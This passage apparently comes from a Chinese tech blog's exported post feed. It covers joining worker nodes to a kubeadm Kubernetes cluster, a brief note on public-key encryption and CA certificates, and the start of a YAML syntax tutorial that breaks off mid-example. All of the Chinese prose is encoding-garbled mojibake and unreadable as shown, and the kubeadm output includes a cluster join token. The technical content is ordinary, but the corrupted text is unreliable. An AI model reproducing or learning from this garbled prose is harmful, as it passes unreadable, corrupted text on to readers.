å…¥èŠ‚ç‚¹ã€‚"></a>å‘é›†ç¾¤ä¸­åŠ å…¥èŠ‚ç‚¹ã€‚</h3><p>åˆ†åˆ«åœ¨k8s-worker01å’Œk8s-worker02ä¸Šæ‰§è¡Œå¦‚ä¸‹ï¼š<br><strong>æ³¨æ„joinåé¢å»æ‰â€™/â€˜</strong></p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">root@k8s-worker02:/home/ubuntu# kubeadm join 172.27.62.80:6443 --token 4xl3r7.55tcry002k98e4zr --discovery-token-ca-cert</span></span><br><span class="line">-hash sha256:c3be275e1dee7da9a0f15db2566b1d26d89d069f729b3f3e2f0601ad1775179b</span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">[preflight] Reading configuration from the cluster...</span><br><span class="line">[preflight] FYI: You can look at this config file with &#x27;kubectl -n kube-system get cm kubeadm-config -o yaml&#x27;</span><br><span class="line">[kubelet-start] Writing kubelet configuration to file <span class="string">&quot;/var/lib/kubelet/config.yaml&quot;</span></span><br><span class="line">[kubelet-start] Writing kubelet environment file with flags to file <span class="string">&quot;/var/lib/kubelet/kubeadm-flags.env&quot;</span></span><br><span class="line">[kubelet-start] Starting the kubelet</span><br><span class="line">[kubelet-start] Waiting for the kubelet to perform the TLS Bootstrap...</span><br><span class="line"></span><br><span class="line">This node has joined the cluster:</span><br><span class="line">* Certificate signing request was sent to apiserver and a response was received.</span><br><span class="line">* The Kubelet was informed of the new secure connection details.</span><br><span class="line"></span><br><span class="line">Run &#x27;kubectl get nodes&#x27; on the control-plane to see this node join the cluster.</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªtokenæœ‰æ•ˆæœŸæ˜¯24å°æ—¶ï¼Œå¦‚æœè¿‡æœŸä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤é‡æ–°ç”Ÿæˆ</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubeadm token create --print-join-command</span><br></pre></td></tr></table></figure><p>é›†ç¾¤èŠ‚ç‚¹çŠ¶æ€éƒ½å˜ä¸ºäº†readyï¼</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">root@k8s-master:/home/ubuntu# kubectl get nodes</span></span><br><span class="line">NAME           STATUS   ROLES                  AGE   VERSION</span><br><span class="line">k8s-master     Ready    control-plane,master   39m   v1.23.5</span><br><span class="line">k8s-worker01   Ready    &lt;none&gt;                 2m    v1.23.5</span><br><span class="line">k8s-worker02   Ready    &lt;none&gt;                 78s   v1.23.5</span><br></pre></td></tr></table></figure><h3 id="å†æ¬¡å¯åŠ¨"><a href="#å†æ¬¡å¯åŠ¨" class="headerlink" title="å†æ¬¡å¯åŠ¨"></a>å†æ¬¡å¯åŠ¨</h3><p>å…³æœºä¹‹åéœ€è¦å†æ¬¡</p><h4 id="rootç”¨æˆ·ï¼šå°†å¦‚ä¸‹å‘½ä»¤åŠ å…¥åˆ°-etc-profile-1"><a href="#rootç”¨æˆ·ï¼šå°†å¦‚ä¸‹å‘½ä»¤åŠ å…¥åˆ°-etc-profile-1" class="headerlink" title="rootç”¨æˆ·ï¼šå°†å¦‚ä¸‹å‘½ä»¤åŠ å…¥åˆ°/etc/profile"></a>rootç”¨æˆ·ï¼šå°†å¦‚ä¸‹å‘½ä»¤åŠ å…¥åˆ°/etc/profile</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; /etc/profile &lt;&lt; EOF</span><br><span class="line"><span class="keyword">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>ä¹‹åå³å¯ä½¿ç”¨k8s-masteräº†ã€‚</p><hr><p>è‡³æ­¤é›†ç¾¤æ­å»ºå®Œæ¯•ã€‚æ¬¢è¿å¤§å®¶æŒ‡æ­£ï¼</p><hr><p>æ¢¦æƒ³è¶Šæ˜¯ç¾ä¸½ï¼Œå°±è¶Šæ˜¯æ˜¾å¾—é¥ä¸å¯åŠã€‚å¯å¥‡æ€ªçš„æ˜¯ï¼Œä¸€æ—¦ä½ ä¸‹å®šäº†å†³å¿ƒï¼Œå¾ˆå¿«åœ°ï¼Œé‚£äº›æ¢¦æƒ³å°±ä¸€ä¸€æˆä¸ºäº†ç°å®ï¼</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> k8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ å¯†åŸç†</title>
      <link href="/2022/07/01/%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/"/>
      <url>/2022/07/01/%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="æ²¡æœ‰caå‚ä¸"><a href="#æ²¡æœ‰caå‚ä¸" class="headerlink" title="æ²¡æœ‰caå‚ä¸"></a>æ²¡æœ‰caå‚ä¸</h2><p>æœåŠ¡ç«¯æŠŠå…¬é’¥å‘ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯ç”¨å…¬é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†åå‘ç»™æœåŠ¡ç«¯ã€‚<br>æœŸé—´å…¬é’¥å¯èƒ½è¢«æˆªè·ï¼Œä½†æ˜¯å…¬é’¥æ— æ³•è§£å¯†å…¬é’¥åŠ å¯†çš„æ•°æ®ï¼Œåªæœ‰ç§é’¥èƒ½è§£å¼€ã€‚</p><h2 id="æœ‰caå‚ä¸"><a href="#æœ‰caå‚ä¸" class="headerlink" title="æœ‰caå‚ä¸"></a>æœ‰caå‚ä¸</h2><p>ç”¨å¯¹ç§°åŠ å¯†ä¿éšœäº†æ— æ³•ç ´è§£å…¬é’¥åŠ å¯†çš„æ•°æ®ï¼Œä½†æ˜¯é»‘å®¢å¯ä»¥ä¼ªé€ æˆæœåŠ¡å™¨æ¥è·å–å®¢æˆ·ç«¯çš„ä¿¡æ¯ï¼Œæ‰€ä»¥éœ€è¦æœåŠ¡ç«¯åšä¸€ä¸ªè®¤è¯ã€‚<br>è®¤è¯çš„è¿‡ç¨‹æ˜¯æœåŠ¡ç«¯æŠŠè‡ªå·±çš„ä¿¡æ¯ï¼ˆå…¬é’¥ï¼‰å‘ç»™caæœºæ„ï¼Œcaæœºæ„ç”¨ç§é’¥ç®—å‡ºä¸€ä¸ªä¿¡æ¯æ‘˜è¦åŠ è¿›æœåŠ¡ç«¯çš„ä¿¡æ¯é‡Œï¼Œå†å‘ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯æ‹¿åˆ°ä¿¡æ¯ä¹‹åï¼Œç”¨æ“ä½œç³»ç»Ÿå†…ç½®çš„caå…¬é’¥ç®—å‡ºä¿¡æ¯æ‘˜è¦ï¼Œå’Œä»–å‘è¿‡æ¥çš„ä¿¡æ¯æ‘˜è¦å¯¹æ¯”ï¼Œå¦‚æœæ˜¯ä¸€è‡´çš„ï¼Œè¯´æ˜ä¿¡æ¯æ˜¯å¯ä¿¡çš„ï¼Œè€Œä¸”ä¿¡æ¯æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚<br>æ­¤æ—¶é»‘å®¢å°±æ²¡æœ‰åŠæ³•ä¼ªé€ æœåŠ¡ç«¯äº†ï¼Œé»‘å®¢æ²¡æœ‰ç»è¿‡caè®¤è¯ï¼Œä»–ä¹Ÿæ— æ³•ç¯¡æ”¹æœåŠ¡ç«¯å‘çš„ä¿¡æ¯ï¼Œä¸€æ—¦æ”¹äº†å®¢æˆ·ç«¯å°†éªŒè¯å¤±è´¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯æ ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åŠ å¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yamlæ–‡ä»¶æ ¼å¼éœ€è¦äº†è§£çš„ç‚¹</title>
      <link href="/2022/07/01/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/"/>
      <url>/2022/07/01/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h2><ul><li><p>YAML çš„åå­—ğŸ¤“</p></li><li><p>YAML çš„ç‰¹ç‚¹</p></li><li><p>YAML éœ€è¦æ³¨æ„çš„</p></li><li><p>YAML åŸºæœ¬ä½¿ç”¨</p><ul><li>åç¼€å</li><li>é”®å€¼å¯¹</li><li>åˆ—è¡¨</li><li>æ³¨é‡Š</li><li>å¤šæ–‡æ¡£</li><li>Pairs</li><li>Set</li></ul></li><li><p>YAML ä¸­çš„ç±»å‹</p><ul><li>å­—ç¬¦ä¸²ï¼ˆstringï¼‰</li><li>å•è¡Œ/å¤šè¡Œæ–‡æœ¬</li><li>æ•°å€¼ï¼ˆNumberï¼‰</li><li>å¸ƒå°”ï¼ˆbooleanï¼‰</li><li>ç©ºå€¼ï¼ˆnullï¼‰</li><li>æ—¶é—´æˆ³ï¼ˆtimestampï¼‰</li><li>ç±»å‹å€¼å¯¹ç…§è¡¨</li><li>æ˜¾ç¤ºç±»å‹</li></ul></li><li><p>é«˜çº§åŠŸèƒ½</p><ul><li>ä»£ç å¤ç”¨ Node Anchors</li><li>å—æ ·å¼å’Œæµæ ·å¼<ul><li>å—æ ·å¼</li><li>æµæ ·å¼</li></ul></li></ul></li><li><p>YAML ä¸ JSON çš„å…³ç³»</p></li><li><p>XMLã€JSONã€YAML</p></li><li><p>YAML é¢‘ç¹å‡ºç°åœ¨å“ªäº›åº”ç”¨ä¸Š</p></li><li><p>å·¥å…·æ±‡æ€»</p></li><li><p>æ€»ç»“</p><h2 id="YAML-çš„åå­—ğŸ¤“"><a href="#YAML-çš„åå­—ğŸ¤“" class="headerlink" title="YAML çš„åå­—ğŸ¤“"></a>YAML çš„åå­—ğŸ¤“</h2><p>æ ¹æ®<a href="https://links.jianshu.com/go?to=https://yaml.org/spec/history/2001-05-26.html">YAML 1.0 è§„èŒƒæ–‡æ¡£ (2001-05-26)</a> YAML æ˜¯ Yet Another Markup Language é¦–å­—æ¯ç¼©ç•¥è¯ï¼Œä½†åæ¥ä¸ºäº†å’ŒçœŸæ­£çš„æ ‡è®°è¯­è¨€åŒºåˆ†ï¼Œåœ¨<a href="https://links.jianshu.com/go?to=https://yaml.org/spec/history/2002-04-07.html">2002-04-07</a>æ ‡å‡†ä¸­æ”¹ä¸º YAML Ainâ€™t Markup Language çš„é¦–å­—æ¯ç¼©å†™ï¼Œç¼©å†™å­—æ¯é‡Œé¢è¿˜æœ‰ YAML è¿™å…¶å®æ˜¯ä¸ªé€’å½’ç¼©å†™ã€‚<br>YAMLï¼ˆ/ËˆjÃ¦mÉ™l/ï¼‰ çš„å‘éŸ³ [jeml]ï¼ŒYAML å‰å– Yet çš„ [je] å‘éŸ³ï¼ŒåæŠ¼è‹±æ–‡å•è¯ camel(éª†é©¼) çš„ [ml] ã€‚</p><h2 id="YAML-çš„ç‰¹ç‚¹"><a href="#YAML-çš„ç‰¹ç‚¹" class="headerlink" title="YAML çš„ç‰¹ç‚¹"></a>YAML çš„ç‰¹ç‚¹</h2></li><li><p>YAMLæ˜¯ä¸€ç§éå¸¸<strong>ç®€å•çš„åŸºäºæ–‡æœ¬çš„äººç±»å¯è¯»çš„è¯­è¨€</strong>ï¼Œç”¨äºåœ¨äººå’Œè®¡ç®—æœºä¹‹é—´äº¤æ¢æ•°æ®ã€‚</p></li><li><p>YAMLæ˜¯_ä¸æ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€_ã€‚å®ƒä¸»è¦ç”¨äº<strong>å­˜å‚¨é…ç½®ä¿¡æ¯</strong>ã€‚</p></li><li><p>YAML çš„ç¼©è¿›å°±åƒ Python çš„ç¼©è¿›ä¸€æ ·ä¼˜é›…ã€‚</p></li><li><p>YAML è¿˜å‡å°‘äº† JSON å’Œ XML æ–‡ä»¶ä¸­çš„å¤§éƒ¨åˆ†â€œå™ªéŸ³â€æ ¼å¼ï¼Œä¾‹å¦‚å¼•å·ã€æ–¹æ‹¬å·å’Œå¤§æ‹¬å·ã€‚</p><h2 id="YAML-éœ€è¦æ³¨æ„çš„"><a href="#YAML-éœ€è¦æ³¨æ„çš„" class="headerlink" title="YAML éœ€è¦æ³¨æ„çš„"></a>YAML éœ€è¦æ³¨æ„çš„</h2></li><li><p>YAML æ˜¯<strong>åŒºåˆ†å¤§å°å†™</strong>ã€‚</p></li><li><p>YAML ä¸å…è®¸ä½¿ç”¨åˆ¶è¡¨ç¬¦ Tab é”®ï¼Œ(ä½ ä¹‹æ‰€æŒ‰ä¸‹ Tab YAML ä»èƒ½ä½¿ç”¨ï¼Œæ˜¯å› ä¸ºç¼–è¾‘å™¨è¢«é…ç½®ä¸ºæŒ‰ä¸‹ Tab é”®ä¼šå¯¼è‡´æ’å…¥é€‚å½“æ•°é‡çš„ç©ºæ ¼)ã€‚</p></li><li><p>YAMLæ˜¯éµå¾ªä¸¥æ ¼ç¼©è¿›çš„ã€‚</p><h2 id="YAML-åŸºæœ¬ä½¿ç”¨"><a href="#YAML-åŸºæœ¬ä½¿ç”¨" class="headerlink" title="YAML åŸºæœ¬ä½¿ç”¨"></a>YAML åŸºæœ¬ä½¿ç”¨</h2><p>å› ä¸ºæˆ‘ä»¬æœ€ç†Ÿæ‚‰çš„æ˜¯ JSONï¼ŒYAML åˆæ˜¯ JSON çš„è¶…é›†ï¼Œå¯ä»¥é€šè¿‡ç®€å•çš„è½¬æ¢ï¼Œè®©æˆ‘ä»¬æ›´å®¹æ˜“çš„ç†è§£ YAML çš„è¯­æ³•ï¼Œè¿™é‡Œæœ‰ä¸ªä¸é”™çš„åœ¨çº¿å·¥å…· <a href="https://links.jianshu.com/go?to=https://codebeautify.org/yaml-to-json-xml-csv">codebeautify</a>ï¼Œä½ å¯ä»¥éšæ—¶æŠŠå†™å¥½çš„ YAML è¯­æ³•è½¬åŒ–ä¸º JSONï¼Œæ¥å¸®åŠ©ä½ ç†è§£ï¼Œä¸è¿‡å¹¶ä¸å»ºè®®ä½ å¼ºçƒˆä¾èµ–å®ƒã€‚</p><h3 id="åç¼€å"><a href="#åç¼€å" class="headerlink" title="åç¼€å"></a>åç¼€å</h3><p>YAML æ–‡ä»¶çš„åç¼€åæ˜¯ .yaml æˆ– .ymlï¼Œæœ¬ç€èƒ½å°‘å†™ä¸å¤šå†™çš„åŸåˆ™ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„æ˜¯.ymlã€‚</p><h3 id="é”®å€¼å¯¹"><a href="#é”®å€¼å¯¹" class="headerlink" title="é”®å€¼å¯¹"></a>é”®å€¼å¯¹</h3><p>YAML æ˜“å­¦å°±åœ¨è¿™é‡Œï¼Œå³ä½¿ä½ æ²¡å­¦ä¹ è¿‡ä»»ä½• YAML çš„è¯­æ³•ï¼Œä½ ä¹Ÿèƒ½å¤§è‡´çœ‹æ‡‚ YAML æ–‡ä»¶ï¼Œè€Œ YAML æ–‡ä»¶ï¼Œæœ€å¸¸è§çš„å°±æ˜¯é”®å€¼å¯¹ï¼Œå¸¸è§çš„ç§°æ³•æ˜¯å¯¹è±¡ã€map æˆ– dictã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;key&gt;: &lt;value&gt; </span><br></pre></td></tr></table></figure><p>å…¶ä¸­<key>ä»£è¡¨ _åç§°_ï¼Œ<value>ä»£è¡¨ <em>æ•°æ®</em> ï¼Œä¹‹é—´ç”¨åˆ†éš”:ï¼ˆç©ºæ ¼æ˜¯å¿…éœ€çš„ï¼‰ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name: CondorHero</span><br><span class="line">age: <span class="number">18</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”åˆ° JSONï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;CondorHero&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a>åˆ—è¡¨</h3><p>è¯´æ•°ç»„å¤§å®¶å¯èƒ½æ›´åŠ ç†Ÿæ‚‰ï¼Œåˆ—è¡¨é€šè¿‡åœ¨å…¶é¡¹ç›®å‰åŠ ä¸Š-ï¼ˆè¿å­—ç¬¦ï¼‰æ¥è¡¨ç¤ºã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">number: </span><br><span class="line">    - One</span><br><span class="line">    - Two</span><br><span class="line">    - Three</span><br></pre></td></tr></table></figure><p>å¯¹åº”åˆ° JSONï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;number&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;One&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Two&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Three&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåˆ—è¡¨æ˜¯åŒ…å«åœ¨å¯¹è±¡é‡Œé¢çš„ï¼Œå¦‚æœæˆ‘ä»¬åƒç›´æ¥è¦ä¸€ä¸ªæ•°ç»„å‘¢ï¼Œæ¯”å¦‚è¯´ä¸‹é¢è¿™ä¸ª JSON åˆ—è¡¨ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;CondorHero&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>: <span class="number">18</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Shavahn&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>: <span class="string">&quot;16&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„ YAML æˆ‘ä»¬å°±å¯ä»¥è¿™ä¹ˆå†™ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- </span><br><span class="line">    name: CondorHero</span><br><span class="line">    age: <span class="number">18</span></span><br><span class="line">- </span><br><span class="line">    name: Shavahn</span><br><span class="line">    age: <span class="number">16</span></span><br></pre></td></tr></table></figure><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>è¿™ä¸ªå°±å¾ˆå¼ºå¤§äº†ï¼ŒYAML ä½œä¸ºé…ç½®æ–‡ä»¶æ¯” JSON æ›´æµè¡Œï¼Œä¸€åœ¨æ˜“è¯»ï¼Œè€Œå°±åœ¨æ”¯æŒæ³¨é‡Šã€‚YAML çš„æ³¨é‡Šå’Œ Bashã€Python çš„æ³¨é‡Šä¸€æ ·ã€‚ä¾‹å¦‚ï¼š</p><h1 id="è¿™æ˜¯ä¸€è¡Œæ³¨é‡Š"><a href="#è¿™æ˜¯ä¸€è¡Œæ³¨é‡Š" class="headerlink" title="è¿™æ˜¯ä¸€è¡Œæ³¨é‡Š"></a>è¿™æ˜¯ä¸€è¡Œæ³¨é‡Š</h1><p>YAMLä¸æ”¯æŒ<strong>å—</strong>æˆ–è€…<strong>å¤šè¡Œ</strong>æ³¨é‡Šã€‚</p><h3 id="å¤šæ–‡æ¡£"><a href="#å¤šæ–‡æ¡£" class="headerlink" title="å¤šæ–‡æ¡£"></a>å¤šæ–‡æ¡£</h3><p>åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œé¢åˆ›å»ºå¤šä¸ªæ–‡æ¡£ï¼Œå®ƒä»¥ä¸‰ä¸ªç ´æŠ˜å·(â€”)å¼€å¤´ï¼Œä»¥ä¸‰ä¸ªå¥ç‚¹(â€¦)ç»“æŸï¼Œå¼€å§‹å’Œç»“æŸéƒ½æ˜¯å¯é€‰çš„ï¼Œå¼€å¤´å¯ä»¥å•ç‹¬ä½¿ç”¨ï¼Œä½†ç»“æŸä¸èƒ½å•ç‹¬ä½¿ç”¨ã€‚<br>è¿™ä¸ªç”¨çš„ä¸å¤šä½†å¾ˆå¼ºå¤§ï¼Œå¯ä»¥æŠŠç›¸åŒæˆ–ç±»ä¼¼çš„éƒ¨åˆ†å½’ä¸ºåŒä¸€éƒ¨åˆ†ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"> - XML</span><br><span class="line"> - JSON</span><br><span class="line"> - CSV</span><br><span class="line">---</span><br><span class="line"> - Unicode</span><br><span class="line"> - ASCII</span><br><span class="line"> - UTF8</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¯¹åº”åœ¨ JSON ä¸­:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&quot;XML&quot;</span>,</span><br><span class="line">    <span class="string">&quot;JSON&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CSV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Unicode&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ASCII&quot;</span>,</span><br><span class="line">    <span class="string">&quot;UTF8&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹ä»‹ç»çš„ YAML è¯­æ³•åœ¨å…¶ä»–è¯­è¨€å¯èƒ½å¹¶æ²¡æœ‰å®ç°ã€‚</p></li></ul><hr><h3 id="Pairs"><a href="#Pairs" class="headerlink" title="Pairs"></a>Pairs</h3><p>Pairs æ˜¯å…è®¸é‡å¤çš„å‘½åå€¼çš„æœ‰åºåˆ—è¡¨ã€‚è®¸å¤šç¼–ç¨‹è¯­è¨€æ²¡æœ‰è¿™ç§æ•°æ®ç±»å‹ï¼Œå› æ­¤åº”ç”¨ç¨‹åºå¯èƒ½ä¼šè§£é‡Šæˆå¯¹ä½œä¸ºå“ˆå¸Œè¡¨æ•°ç»„ï¼Œæ¯ä¸ªå“ˆå¸Œè¡¨åŒ…å«ä¸€ä¸ªé”®ã€‚è¯·å‚è§ä¸‹é¢çš„ç¤ºä¾‹ä»¥äº†è§£å…¶ç”¨æ³•ã€‚<br>è¿™ä¸ªæœ‰ç‚¹åƒ JS ä¸­ key ä¸º symbol çš„å¯¹è±¡ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Explicitly typed pairs.</span><br><span class="line">Block tasks: !!pairs</span><br><span class="line">  - meeting: standup</span><br><span class="line">  - meeting: demo</span><br><span class="line">  - <span class="keyword">break</span>: lunch</span><br><span class="line">  - meeting: all hands</span><br><span class="line">Flow tasks: !!pairs [ meeting: standup, meeting: lunch ]</span><br></pre></td></tr></table></figure><h3 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h3><p>Set æ›´å¤šçš„å«æ³•æ˜¯é›†åˆï¼Œå®ƒæ˜¯å…·æœ‰<strong>ä¸åŒå€¼</strong>çš„æ— åºèŠ‚ç‚¹é›†åˆï¼Œæ•°ç»„å»é‡æœ€å¿«æ·çš„æ–¹æ³•äº†ã€‚è¯·å‚è§ä¸‹é¢çš„ç¤ºä¾‹ä»¥äº†è§£å…¶ç”¨æ³•ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Explicitly typed set.</span><br><span class="line">players: !!set</span><br><span class="line">  ? Mark</span><br><span class="line">  ? Steve</span><br><span class="line">  ? Smith</span><br><span class="line"></span><br><span class="line"># Flow style</span><br><span class="line">soccer teams: !!set &#123; Chelsea, Arsenal, Liverpool &#125;</span><br></pre></td></tr></table></figure><p>Python æ˜¯æ”¯æŒè¿™ç§æ•°æ®ç±»å‹çš„ï¼Œä¸Šé¢çš„ä»£ç åœ¨ Python å±•ç¤ºä¸ºï¼š</p><p><img src="http://106.12.125.218/medias/medias/yaml%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84%E7%82%B9/0.png"><br>ä½ å¯ä»¥é€šè¿‡è¿™ä¸ªç½‘ç«™ <a href="https://links.jianshu.com/go?to=http://yaml-online-parser.appspot.com/">http://yaml-online-parser.appspot.com/</a> æ¥æŠŠ YAML ç¼–è¯‘æˆ Python ä»£ç ã€‚</p><h2 id="YAML-ä¸­çš„ç±»å‹"><a href="#YAML-ä¸­çš„ç±»å‹" class="headerlink" title="YAML ä¸­çš„ç±»å‹"></a>YAML ä¸­çš„ç±»å‹</h2><p>Perl, Python, PHP, Java, C#, Ruby, and JavaScript ç­‰å¤§å¤šæ•°è¯­è¨€æœ‰çš„ç±»å‹ï¼ŒYAML éƒ½èƒ½å¾ˆå¥½åœ°æ”¯æŒã€‚<br>YAML æ”¯æŒçš„æ•°æ®ç±»å‹åˆ—è¡¨å¦‚ä¸‹ï¼š</p><ul><li>Boolean</li><li>Numbers</li><li>Strings</li><li>Arrays</li><li>Maps</li><li>Null</li><li>Dates</li><li>Timestamp</li></ul><p>å…³äºå˜é‡è¿™é‡Œæœ‰ä¸ªå¥½ç©çš„äº‹æƒ…ï¼Œå˜é‡å¯¹åº”çš„è‹±æ–‡å•è¯æ˜¯ variableï¼ŒYAML è¿˜å¯ä»¥ç”¨å¦ä¸€ä¸ªå•è¯ <strong>scalars</strong> æ ‡é‡ã€‚ä¸è¿‡ä¹Ÿèƒ½ç†è§£ YAML é‡Œé¢æ²¡æœ‰å˜é‡çš„å®šä¹‰ï¼Œéƒ½æ˜¯ç›´æ¥ä½¿ç”¨ï¼Œæ‰€ä»¥æ•°æ®ç±»å‹æ›´å¤šåƒç”¨äºåŒºåˆ†ç±»å‹ï¼Œè¿™éš¾é“ä¸æ˜¯è¡¡é‡æ ‡å‡†å—ï¼Œæ‰€ä»¥å«æ ‡é‡å¾ˆåˆé€‚ã€‚ï¼ˆè¿™ä¸ªå¼‚æ›²åŒå·¥ä¹‹å¦™å°±åƒ Typescript ä¸­çš„<strong>ç±»å‹æ³¨è§£</strong>ä¸€æ ·ï¼‰<br>æ¯”å¦‚ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dataType:</span><br><span class="line">  <span class="keyword">string</span>: <span class="string">&quot;YAML&quot;</span></span><br><span class="line">  integer: <span class="number">123</span></span><br><span class="line">  float: <span class="number">12.345</span></span><br><span class="line">  boolean: No</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆ JSONï¼š</p><figure 